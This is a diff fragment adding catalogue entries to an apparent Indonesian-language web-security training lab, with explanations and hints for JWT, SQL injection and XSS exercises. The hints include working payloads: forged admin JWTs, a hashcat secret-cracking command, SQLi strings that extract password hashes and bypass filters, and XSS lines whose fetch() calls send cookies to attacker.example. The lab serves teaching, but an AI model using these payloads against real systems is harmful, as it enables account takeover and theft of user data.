+        "Lihat Hint Goal: halaman \"receipt\" ini menaruh nomor kartu kredit langsung di query string\nURL ( ?card=... ) supaya \"bisa dibagikan lewat link\". Masalahnya, browser secara\notomatis mengirim URL lengkap (termasuk query string) sebagai header Referer ke\nresource pihak ketiga mana pun yang dimuat di halaman ini — widget analytics, font,\ngambar, dsb. Di lab ini, resource pihak ketiga itu disimulasikan lewat analytics_beacon.php (bayangkan ini domain analytics sungguhan, mis. analytics.example.com ). Scroll ke bawah untuk lihat \"log\" yang tertangkap di sisi\nmereka. URL yang bocor juga tersimpan di: riwayat browser, log server proxy/CDN, dan\nbookmark yang dibagikan ke orang lain secara tidak sengaja."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Header Cache-Control tidak diset",
+      "paragraphs": [
+        "Tanpa Cache-Control: no-store, cache di antara server dan browser bisa menyimpan & mengulang response berisi data pribadi ke pengunjung berikutnya."
+      ],
+      "id": "a04-cryptographic-failures--sensitive-data-exposure--missing-cache-control",
+      "category": "a04-cryptographic-failures",
+      "topic": "sensitive-data-exposure",
+      "source_lab_status": 200,
+      "source_order": 46,
+      "source_hints": [
+        "Lihat Hint Goal: mode insecure di halaman ini tidak pernah mengirim header Cache-Control , sehingga disimulasikan seolah ada shared cache (proxy kantor, CDN,\natau disk cache browser di komputer bersama) yang menyimpan response pertama dan\nmenyajikannya ulang ke pengunjung berikutnya siapa pun mereka . Langkah: \"Ganti ke bob\" di navbar, buka halaman ini dengan ?mode=insecure — data\nbob ter-cache. \"Ganti ke alice\", buka ?mode=insecure lagi — alice melihat data BOB dari\ncache, bukan datanya sendiri! Klik \"Clear cache\", ulangi dengan ?mode=secure — setiap user selalu\nmelihat datanya sendiri karena Cache-Control: no-store mencegah penyimpanan sama\nsekali. Cek juga dengan curl: curl -I \"http://target/lab2_missing_cache_control.php?mode=insecure\" vs ?mode=secure — bandingkan ada/tidaknya header Cache-Control ."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Data sensitif tidak di-mask",
+      "paragraphs": [
+        "Satu endpoint menerapkan masking kartu dengan benar, endpoint lain untuk data yang sama lupa menerapkannya."
+      ],
+      "id": "a04-cryptographic-failures--sensitive-data-exposure--unmasked-response",
+      "category": "a04-cryptographic-failures",
+      "topic": "sensitive-data-exposure",
+      "source_lab_status": 200,
+      "source_order": 47,
+      "source_hints": [
+        "Lihat Hint Goal: kodebase aplikasi ini SUDAH punya fungsi mask_card() yang\nbenar (lihat \"Halaman Profil\" di bawah, kartu tampil sebagai ************1234 ).\nTapi endpoint \"Riwayat Transaksi\" di bawahnya lupa memanggil fungsi itu, dan menampilkan nomor\nkartu lengkap apa adanya di response — kesalahan konsistensi yang sangat umum terjadi\nketika masking diterapkan per-endpoint secara manual alih-alih dipaksakan di satu lapisan\nserialisasi terpusat."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Algoritma alg=none diterima",
+      "paragraphs": [
+        "alg: none seharusnya tidak pernah diterima untuk token otentikasi, tapi server ini mempercayai payloadnya begitu saja."
+      ],
+      "id": "a04-cryptographic-failures--jwt--alg-none",
+      "category": "a04-cryptographic-failures",
+      "topic": "jwt",
+      "source_lab_status": 200,
+      "source_order": 48,
+      "source_hints": [
+        "Lihat Hint Goal: token normal kamu (role: user) ditandatangani HS256 dengan secret yang\ntidak pernah diberitahukan ke kamu. Tapi fungsi verifikasi server juga menerima alg: \"none\" — nilai yang secara spesifikasi JWS memang ada, tapi hanya boleh\ndipakai dalam konteks yang integritasnya sudah dijamin lewat cara lain, bukan untuk token otentikasi. Server ini keliru mempercayai payload token alg: none begitu saja, tanpa signature apa pun. Header JSON: {\"typ\":\"JWT\",\"alg\":\"none\"} Payload JSON: {\"username\":\"admin\",\"role\":\"admin\"} Base64URL masing-masing bagian (tanpa padding = , + → - , / → _ ): Header: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0 Payload: eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0 Gabungkan jadi header.payload. (perhatikan titik terakhir - bagian\nsignature sengaja dikosongkan karena alg: none tidak butuh signature): eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "token"
+      ]
+    },
+    {
+      "title": "Secret HMAC lemah",
+      "paragraphs": [
+        "Kekuatan HS256 bergantung penuh pada kerahasiaan & entropi secret-nya - secret umum bisa ditemukan lewat hashcat -m 16500."
+      ],
+      "id": "a04-cryptographic-failures--jwt--weak-secret",
+      "category": "a04-cryptographic-failures",
+      "topic": "jwt",
+      "source_lab_status": 200,
+      "source_order": 49,
+      "source_hints": [
+        "Lihat Hint Goal: token ditandatangani HS256 dengan secret pendek yang bisa ditemukan di\nwordlist umum untuk JWT (mis. daftar bawaan jwt_tool atau mode hashcat -m 16500 ). Gunakan tool \"Forge Token\" di bawah untuk mencoba tiap kandidat secret\ndari wordlist — kalau tebakanmu benar, token forge-anmu akan diterima server sebagai\nadmin. Di dunia nyata: hashcat -m 16500 token.txt wordlist.txt mencoba\njutaan kandidat per detik secara offline, tanpa perlu menyentuh server sama sekali sampai\nsecret ditemukan."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "secret",
+        "username",
+        "role",
+        "token"
+      ]
+    },
+    {
+      "title": "Signature tidak pernah diverifikasi",
+      "paragraphs": [
+        "Server hanya men-decode payload dan tidak pernah menghitung ulang & membandingkan signature-nya."
+      ],
+      "id": "a04-cryptographic-failures--jwt--no-signature-check",
+      "category": "a04-cryptographic-failures",
+      "topic": "jwt",
+      "source_lab_status": 200,
+      "source_order": 50,
+      "source_hints": [
+        "Lihat Hint Goal: kali ini server bahkan tidak repot-repot mengecek algoritma khusus —\nfungsi verifikasinya cuma base64_decode bagian payload dan langsung mempercayainya.\nKamu tidak perlu tahu secret sama sekali (berbeda dari Lab 2), dan tidak perlu trik alg: none (berbeda dari Lab 1) — cukup ubah payload token asli, isi bagian\nsignature dengan APA SAJA (bahkan string acak), dan server tetap menerimanya. Payload hasil edit: {\"username\":\"admin\",\"role\":\"admin\"} Token lengkap (signature sengaja diisi teks acak untuk membuktikan poinnya): eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.anything-goes-here-signature-is-never-checked"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "token"
+      ]
+    },
+    {
+      "title": "Path traversal lewat header kid",
+      "paragraphs": [
+        "Mengarahkan kid ke /dev/null lewat path traversal membuat server memakai kunci HMAC yang sudah diketahui pasti: string kosong."
+      ],
+      "id": "a04-cryptographic-failures--jwt--kid-path-traversal",
+      "category": "a04-cryptographic-failures",
+      "topic": "jwt",
+      "source_lab_status": 200,
+      "source_order": 51,
+      "source_hints": [
+        "Lihat Hint Goal: token asli punya header kid: \"hs256.key\" yang memberitahu\nserver file kunci mana yang harus dibaca dari folder keys/ untuk verifikasi HMAC.\nServer membangun path dengan __DIR__ . '/keys/' . $kid tanpa sanitasi apa pun —\npersis pola Local File Inclusion / path traversal yang sudah kamu pelajari di kategori\nInjection, tapi sekarang lewat header JWT. Arahkan kid ke file yang (a) pasti ada\ndi container Linux manapun, dan (b) isinya sudah kamu ketahui persis: /dev/null ,\nyang selalu kosong. Kalau server membaca /dev/null sebagai kunci, itu artinya\nkuncinya adalah string kosong — dan kamu bisa menandatangani token\nsendiri dengan kunci kosong itu. Header hasil edit (kid diarahkan ke /dev/null lewat traversal): {\"typ\":\"JWT\",\"alg\":\"HS256\",\"kid\":\"../../../../../../dev/null\"} Token lengkap (ditandatangani HMAC-SHA256 dengan kunci string kosong): eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.v8SW96GJAvwUjuMy658tXdV11g00piKd3hn_IqvRZV0"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "token"
+      ]
+    },
+    {
+      "title": "Login Bypass (Authentication Bypass)",
+      "paragraphs": [
+        "Query login membandingkan username & password langsung dari input, mis. ... WHERE username='$u' AND password='$p'. Dengan menyisipkan tanda kutip dan komentar SQL (-- ), bagian pengecekan password bisa \"dihilangkan\" dari query yang benar-benar dijalankan.",
+        "Contoh payload: username = admin' -- -, password = bebas."
+      ],
+      "id": "a05-injection--sqli--login-bypass",
+      "category": "a05-injection",
+      "topic": "sqli",
+      "source_lab_status": 200,
+      "source_order": 52,
+      "source_hints": [
+        "Lihat Hint Goal: log in as admin without knowing the password. The query is\nshown after each attempt so you can see exactly what was executed."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "password"
+      ]
+    },
+    {
+      "title": "UNION-based SQL Injection",
+      "paragraphs": [
+        "Jika hasil query ditampilkan langsung ke halaman, klausa UNION SELECT bisa dipakai untuk \"menempelkan\" hasil dari tabel lain (mis. tabel users) ke dalam tampilan yang sama, asalkan jumlah & tipe kolomnya cocok.",
+        "Contoh payload: id=0 UNION SELECT username,password,role,1 FROM users-- -"
+      ],
+      "id": "a05-injection--sqli--union",
+      "category": "a05-injection",
+      "topic": "sqli",
+      "source_lab_status": 200,
+      "source_order": 53,
+      "source_hints": [
+        "Lihat Hint Goal: this page lists a single product by numeric id . The products\ntable has 4 columns. Try to find out how many columns the underlying query has, then use a\nUNION SELECT to pull data out of the users table instead."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "id"
+      ]
+    },
+    {
+      "title": "Error-based SQL Injection",
+      "paragraphs": [
+        "Ketika aplikasi menampilkan pesan error mentah dari database, fungsi seperti extractvalue() bisa dipaksa gagal dengan cara yang menyisipkan hasil sebuah subquery ke dalam teks error itu sendiri - sehingga data bisa \"dibaca\" lewat pesan error, satu subquery per request.",
+        "Contoh payload: category=' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -"
+      ],
+      "id": "a05-injection--sqli--error-based",
+      "category": "a05-injection",
+      "topic": "sqli",
+      "source_lab_status": 200,
+      "source_order": 54,
+      "source_hints": [
+        "Lihat Hint Goal: this page filters products by category and displays raw MySQL\nerrors when the query is malformed. Use a function such as extractvalue() or updatexml() with an intentionally invalid XPath to leak data (e.g. the database\nversion or a subquery result) through the error message."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "category"
+      ]
+    },
+    {
+      "title": "Blind SQL Injection (Boolean-based)",
+      "paragraphs": [
+        "Tidak ada data maupun error yang ditampilkan - hanya ada dua kemungkinan respons (mis. \"ditemukan\" / \"tidak ditemukan\"). Respons ini dipakai sebagai oracle benar/salah untuk menebak data karakter demi karakter memakai kondisi seperti SUBSTRING(...)='x'.",
+        "Contoh payload: id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='S'"
+      ],
+      "id": "a05-injection--sqli--blind-boolean",
+      "category": "a05-injection",
+      "topic": "sqli",
+      "source_lab_status": 200,
+      "source_order": 55,
+      "source_hints": [
+        "Lihat Hint Goal: this \"stock checker\" only ever renders one of two messages\n( In stock / Not found ) — there are no visible errors and no data is\nreturned directly. Use this true/false oracle with boolean conditions\n( AND 1=1 , AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' ,\netc.) to extract data one character at a time."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "id"
+      ]
+    },
+    {
+      "title": "Blind SQL Injection (Time-based)",
+      "paragraphs": [
+        "Respons aplikasi selalu identik apa pun hasil query-nya, sehingga oracle benar/salah dari respons tidak tersedia. Sebagai gantinya, fungsi SLEEP() disisipkan secara kondisional - jika kondisi benar, server akan terasa lebih lambat merespons.",
+        "Contoh payload: id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='S',SLEEP(3),0)"
+      ],
+      "id": "a05-injection--sqli--blind-time",
+      "category": "a05-injection",
+      "topic": "sqli",
+      "source_lab_status": 200,
+      "source_order": 56,
+      "source_hints": [
+        "Lihat Hint Goal: this \"activity logger\" endpoint always shows the exact same generic\nmessage, regardless of the query outcome, so a boolean oracle is not available. Use SLEEP() inside the injected condition (e.g. 1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='S',SLEEP(3),0) )\nand measure the response time to infer data one bit/character at a time."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "id"
+      ]
+    },
+    {
+      "title": "Second-Order SQL Injection",
+      "paragraphs": [
+        "Saat disimpan (mis. saat registrasi), input memang diproses dengan aman lewat prepared statement. Masalah muncul belakangan, ketika fitur lain membaca kembali data yang tersimpan itu dan menggabungkannya ke query baru tanpa perlakuan aman yang sama.",
+        "Contoh: Daftar dengan username x' UNION SELECT password FROM users WHERE username='admin'-- -, lalu buka fitur \"lihat profil\" untuk memicu query kedua yang tidak aman."
+      ],
+      "id": "a05-injection--sqli--second-order",
+      "category": "a05-injection",
+      "topic": "sqli",
+      "source_lab_status": 200,
+      "source_order": 57,
+      "source_hints": [
+        "Lihat Hint Goal: registration uses a parameterised query, so the username is\nstored safely. But the \"View My Bio\" feature later rebuilds a new query using\nthat stored username, unsafely. Register with a username that breaks out of the quotes and\nUNION-selects data from the users table, then view your bio to trigger it.\nExample username: x' UNION SELECT password FROM users WHERE username='admin'-- -"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "bio"
+      ]
+    },
+    {
+      "title": "SQL Injection pada klausa ORDER BY",
+      "paragraphs": [
+        "Prepared statement tidak bisa memparameterisasi nama kolom/ekspresi pada ORDER BY, sehingga developer sering menggabungkannya langsung dari input. UNION tidak berlaku di sini - teknik yang dipakai adalah oracle boolean lewat ekspresi CASE WHEN.",
+        "Contoh payload: sort=(CASE WHEN (1=1) THEN name ELSE price END) dibandingkan dengan kondisi 1=2."
+      ],
+      "id": "a05-injection--sqli--order-by",
+      "category": "a05-injection",
+      "topic": "sqli",
+      "source_lab_status": 200,
+      "source_order": 58,
+      "source_hints": [
+        "Lihat Hint Goal: prepared statements cannot parameterise the ORDER BY expression itself, so developers often concatenate it \"because it's just a column name\".\nYou cannot use UNION here. Instead, use conditional expressions to build a boolean oracle,\ne.g. sort=(CASE WHEN (1=1) THEN name ELSE price END) vs (CASE WHEN (1=2) THEN name ELSE price END) and observe how the row order changes,\nor trigger a visible error with an invalid expression to confirm injection."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "sort"
+      ]
+    },
+    {
+      "title": "Stacked queries",
+      "paragraphs": [
+        "Fitur \"catatan cepat\" memakai mysqli_multi_query() yang mendukung multi-statement per pemanggilan - berbeda dari UNION yang cuma membaca data, di sini attacker bisa menambahkan statement SQL baru (INSERT/DROP) setelah ;.",
+        "Contoh payload: note=x'); INSERT INTO notes (text) VALUES ('injected via stacked query'); --"
+      ],
+      "id": "a05-injection--sqli--stacked-queries",
+      "category": "a05-injection",
+      "topic": "sqli",
+      "source_lab_status": 200,
+      "source_order": 59,
+      "source_hints": [
+        "Lihat Hint Goal: fitur \"catatan cepat\" ini memakai mysqli_multi_query() , bukan query() /prepared statement biasa seperti lab-lab lain. Ini berarti server benar-benar\nakan menjalankan lebih dari satu statement SQL kalau Anda menutup statement INSERT pertama dengan ') , menambahkan titik koma dan statement SQL baru, lalu mengomentari\nsisa query aslinya. Perhatikan tabel \"notes\" di bawah setelah submit - apakah muncul baris baru\nyang tidak Anda ketik langsung di form?"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "note"
+      ]
+    },
+    {
+      "title": "Filter/WAF bypass",
+      "paragraphs": [
+        "Filter regex hanya menolak frasa union select dengan spasi di antaranya - menyisipkan komentar SQL inline sebagai pemisah membuat filter ini lolos begitu saja.",
+        "Contoh payload: category=nonexistent' UNION/**/SELECT username,password,role,1 FROM users-- -"
+      ],
+      "id": "a05-injection--sqli--filter-bypass",
+      "category": "a05-injection",
+      "topic": "sqli",
+      "source_lab_status": 200,
+      "source_order": 60,
+      "source_hints": [
+        "Lihat Hint Goal: sama seperti Lab 3 (UNION lewat parameter category ), tapi\nsekarang ada filter yang memblokir kalau input mengandung frasa union select (spasi/tab/baris baru di antaranya tetap kena blokir). Filter ini hanya mengenali whitespace\nsebagai pemisah kata - ia tidak tahu bahwa MySQL juga menerima komentar inline\n( /**/ ) sebagai pemisah token yang sah antar keyword. Coba ganti spasi antara UNION dan SELECT dengan /**/ ."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "category"
+      ]
+    },
+    {
+      "title": "SQLi di konteks INSERT (form registrasi)",
+      "paragraphs": [
+        "Injection tidak melulu soal SELECT/WHERE - field \"bio\" pada form registrasi digabung mentah ke query INSERT, dieksploitasi dengan teknik error-based yang sama seperti pada SELECT."
+      ],
+      "id": "a05-injection--sqli--insert-based",
+      "category": "a05-injection",
+      "topic": "sqli",
+      "source_lab_status": 200,
+      "source_order": 61,
+      "source_hints": [
+        "Lihat Hint Goal: injeksi tidak hanya terjadi di klausa SELECT / WHERE - di mana pun input user disambung ke SQL adalah titik injeksi potensial, termasuk statement INSERT . Form registrasi ini menerima username dan bio ,\nlalu memasukkannya ke INSERT INTO reg_demo_users (username, bio) VALUES (...) .\nKarena tabel ini cuma punya 2 kolom, Anda tidak bisa menambah kolom baru dengan koma - tapi\nAnda bisa mengubah nilai kolom bio menjadi sebuah ekspresi (bukan cuma string\nstatis) memakai operator OR , lalu menyisipkan fungsi pemicu error seperti extractvalue() di dalamnya untuk membocorkan data dari tabel users lewat pesan error."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "bio"
+      ]
+    },
+    {
+      "title": "SQLi lewat cookie",
+      "paragraphs": [
+        "Fitur \"produk yang baru dilihat\" memakai nilai cookie TrackingId langsung di query - channel input yang mudah luput dari audit karena tidak terlihat sebagai parameter URL/form biasa."
+      ],
+      "id": "a05-injection--sqli--cookie-based",
+      "category": "a05-injection",
+      "topic": "sqli",
+      "source_lab_status": 200,
+      "source_order": 62,
+      "source_hints": [
+        "Lihat Hint Goal: halaman ini menampilkan \"produk yang baru saja Anda lihat\" berdasarkan\ncookie TrackingId yang di-set otomatis saat pertama kali membuka halaman ini -\ntidak ada form/parameter URL yang terlihat untuk field ini. Buka DevTools → Application/\nStorage → Cookies (atau intercept dengan Burp), ubah nilai cookie TrackingId secara manual, lalu reload halaman. Query-nya sama persis strukturnya dengan Lab 2 (UNION-based),\njadi payload UNION yang sama seharusnya berfungsi di sini juga. Sebagai kemudahan tanpa\nDevTools, form di bawah ini juga bisa dipakai untuk mengubah nilai cookie tersebut."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "tracking_id"
+      ]
+    },
+    {
+      "title": "Reflected XSS (konteks HTML body)",
+      "paragraphs": [
+        "Nilai parameter (mis. hasil pencarian) dicetak langsung ke body HTML tanpa htmlspecialchars(), sehingga tag apa pun yang disisipkan lewat URL akan ikut dirender oleh browser.",
+        "Contoh payload: ?q=<script>alert(document.domain)</script>"
+      ],
+      "id": "a05-injection--xss--reflected-html",
+      "category": "a05-injection",
+      "topic": "xss",
+      "source_lab_status": 200,
+      "source_order": 63,
+      "source_hints": [
+        "Lihat Hint Goal: parameter q dicetak langsung ke body HTML tanpa di-escape.\nCoba: ?q=<script>alert(document.domain)</script> atau ?q=<img src=x onerror=alert(1)>"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "q"
+      ]
+    },
+    {
+      "title": "Reflected XSS (konteks atribut HTML)",
+      "paragraphs": [
+        "Input dicetak di dalam atribut seperti value=\"...\". Karena masih di dalam tanda kutip atribut, penyerang perlu menutup tanda kutip & tag tersebut lebih dulu sebelum bisa menyisipkan tag/handler baru.",
+        "Contoh payload: ?color=\"><script>alert(1)</script>"
+      ],
+      "id": "a05-injection--xss--reflected-attribute",
+      "category": "a05-injection",
+      "topic": "xss",
+      "source_lab_status": 200,
+      "source_order": 64,
+      "source_hints": [
+        "Lihat Hint Goal: parameter color ditaruh di dalam atribut value=\"...\" sebuah input, dan dikutip dengan tanda kutip ganda. Kamu harus keluar\ndari atribut dulu sebelum bisa menyisipkan tag/handler baru. Coba: ?color=\"><script>alert(1)</script> atau lebih rapi: ?color=\" onmouseover=\"alert(1) lalu arahkan mouse ke kotak input tersebut."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "color"
+      ]
+    },
+    {
+      "title": "Reflected XSS (konteks JavaScript)",
+      "paragraphs": [
+        "Input dimasukkan ke dalam variabel JavaScript, mis. var x = \"...\";. Escaping yang tidak lengkap (mis. hanya meng-escape kutip) bisa dilewati, atau tag </script> dipakai untuk menutup blok script secara langsung di level parser HTML.",
+        "Contoh payload: ?name=</script><script>alert(1)</script>"
+      ],
+      "id": "a05-injection--xss--reflected-js",
+      "category": "a05-injection",
+      "topic": "xss",
+      "source_lab_status": 200,
+      "source_order": 65,
+      "source_hints": [
+        "Lihat Hint Goal: parameter name disisipkan ke dalam string JavaScript inline.\nAplikasi hanya meng-escape tanda kutip ganda ( \" ), sehingga kamu bisa menutup string\ndengan cara lain lalu menyisipkan kode. Coba: ?name=</script><script>alert(1)</script> (menutup tag script\nsecara langsung di level parser HTML, sebelum sempat jadi JS) atau gunakan backslash untuk\nmenetralkan escaping kutip: ?name=\\\";alert(1);// (backslash yang mendahului kutip\nmembuat hasil escape jadi \\\\\" , yaitu string berisi satu backslash, sehingga kutip\nberikutnya tetap menutup string lebih awal dari yang diharapkan)."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "name"
+      ]
+    },
+    {
+      "title": "Stored XSS",
+      "paragraphs": [
+        "Payload disimpan secara permanen (mis. di kolom komentar) dan ditampilkan ke setiap orang yang membuka halaman tersebut, tanpa perlu mengirim link khusus ke korban. Ini biasanya lebih berbahaya dari reflected XSS karena bisa menyerang banyak korban sekaligus, termasuk admin.",
+        "Contoh payload: <script>alert(document.cookie)</script> dikirim lewat form komentar."
+      ],
+      "id": "a05-injection--xss--stored",
+      "category": "a05-injection",
+      "topic": "xss",
+      "source_lab_status": 200,
+      "source_order": 66,
+      "source_hints": [
+        "Lihat Hint Goal: komentar yang kamu kirim disimpan di server dan akan ditampilkan ke setiap pengunjung halaman ini (termasuk peserta lain / \"admin\" bila ada yang\nmembukanya), tanpa di-escape. Coba kirim komentar berisi <script>alert(document.cookie)</script> atau <img src=x onerror=fetch('https://attacker.example/steal?c='+document.cookie)> untuk mensimulasikan pencurian cookie/sesi."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "name",
+        "comment"
+      ]
+    },
+    {
+      "title": "DOM-based XSS",
+      "paragraphs": [
+        "JavaScript di browser membaca data yang bisa dikendalikan penyerang (mis. location.hash) dan menuliskannya ke innerHTML tanpa sanitasi. Karena fragment URL (bagian setelah #) tidak pernah dikirim ke server, payload ini tidak akan pernah muncul di log server.",
+        "Contoh payload: buka halaman.php#<img src=x onerror=alert(1)>"
+      ],
+      "id": "a05-injection--xss--dom-based",
+      "category": "a05-injection",
+      "topic": "xss",
+      "source_lab_status": 200,
+      "source_order": 67,
+      "source_hints": [
+        "Lihat Hint Goal: JavaScript di halaman ini membaca location.hash (bagian\nsetelah # di URL, yang tidak pernah dikirim ke server ) dan\nmenulisnya langsung ke innerHTML . Ini murni client-side, server tidak melihat\npayload sama sekali. Coba buka: lab5_dom_xss.php#<img src=x onerror=alert(document.domain)>"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "XSS dengan Filter Bypass",
+      "paragraphs": [
+        "Aplikasi mencoba memblokir XSS dengan menghapus string tertentu (mis. <script>) secara harfiah. Filter blacklist seperti ini nyaris selalu bisa dilewati lewat variasi kapitalisasi, tag lain, atau event handler HTML.",
+        "Contoh payload: <img src=x onerror=alert(1)> atau <svg onload=alert(1)>"
+      ],
+      "id": "a05-injection--xss--filter-bypass",
+      "category": "a05-injection",
+      "topic": "xss",
+      "source_lab_status": 200,
+      "source_order": 68,
+      "source_hints": [
+        "Lihat Hint Goal: ada filter naif yang menghapus string <script> (persis, case-sensitive) dari input, lalu hasilnya dicetak tanpa encoding lain. Filter ini bisa\ndilewati dengan berbagai cara. Coba salah satu: Ubah kapitalisasi: <ScRiPt>alert(1)</ScRiPt> Pakai tag lain: <img src=x onerror=alert(1)> Pakai event handler tanpa tag script: <svg onload=alert(1)> Nested tag: <scr<script>ipt>alert(1)</scr<script>ipt>"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "input"
+      ]
+    },
+    {
+      "title": "Reflected XSS via HTTP Header",
+      "paragraphs": [
+        "Bukan hanya parameter URL yang bisa jadi sumber input berbahaya - header HTTP seperti User-Agent juga sepenuhnya dikendalikan pengirim request dan mudah dimanipulasi lewat curl atau proxy seperti Burp Suite.",
+        "Contoh: curl -A \"<script>alert(1)</script>\" http://target/halaman.php"
+      ],
+      "id": "a05-injection--xss--header-based",
+      "category": "a05-injection",
+      "topic": "xss",
+      "source_lab_status": 200,
+      "source_order": 69,
+      "source_hints": [
+        "Lihat Hint Goal: halaman \"analytics\" ini menampilkan kembali header User-Agent dari request tanpa di-escape. Header HTTP mudah dimanipulasi (browser dev tools, curl, atau\nproxy seperti Burp Suite), jadi ini adalah bentuk lain dari reflected XSS yang tidak melibatkan\nparameter URL sama sekali. Coba dengan curl: curl -A \"<script>alert(document.domain)</script>\" http://localhost:8079/xss/lab7_useragent.php Atau ganti User-Agent lewat DevTools → Network conditions, lalu reload halaman ini."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "XSS via javascript: URI di atribut href",
+      "paragraphs": [
+        "Nilai URL sudah di-escape dengan benar sebagai atribut HTML (bukan bug attribute-injection biasa), tapi tidak ada allowlist skema URL - javascript: tetap jadi string atribut yang valid dan dieksekusi browser saat link-nya diklik.",
+        "Contoh payload: Website = javascript:alert(document.domain)"
+      ],
+      "id": "a05-injection--xss--javascript-uri",
+      "category": "a05-injection",
+      "topic": "xss",
+      "source_lab_status": 200,
+      "source_order": 70,
+      "source_hints": [
+        "Lihat Hint Goal: field \"Website\" di form edit profil ini disisipkan ke atribut href=\"...\" pada link \"Kunjungi website saya\" di bagian preview. Atributnya\ndi-escape dengan benar pakai htmlspecialchars() , jadi payload klasik seperti \"><script> TIDAK akan berhasil di sini — ini bukan bug missing-encoding\nseperti Lab 2. Masalahnya: tidak ada pengecekan bahwa nilai yang dimasukkan harus diawali http:// atau https:// . Browser tetap mengizinkan skema javascript: sebagai nilai atribut href yang 100% valid dan\n\"aman\" dari sisi HTML-encoding, tapi begitu link diklik, isi setelah javascript: dieksekusi sebagai kode JavaScript dengan origin situs ini. Coba isi field Website dengan: javascript:alert(document.domain) atau simulasi pencurian cookie yang lebih realistis: javascript:fetch('https://attacker.example/steal?c='+document.cookie) Simpan profil, lalu klik link \"Kunjungi website saya\" di bagian preview di\nbawah form."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "website"
+      ]
+    },
+    {
+      "title": "Stored XSS via SVG upload",
+      "paragraphs": [
+        "Upload avatar tidak memvalidasi konten file sama sekali. SVG adalah XML - browser mengeksekusi <script>/onload di dalamnya begitu file dibuka langsung di tab baru."
+      ],
+      "id": "a05-injection--xss--svg-upload",
+      "category": "a05-injection",
+      "topic": "xss",
+      "source_lab_status": 200,
+      "source_order": 71,
+      "source_hints": [
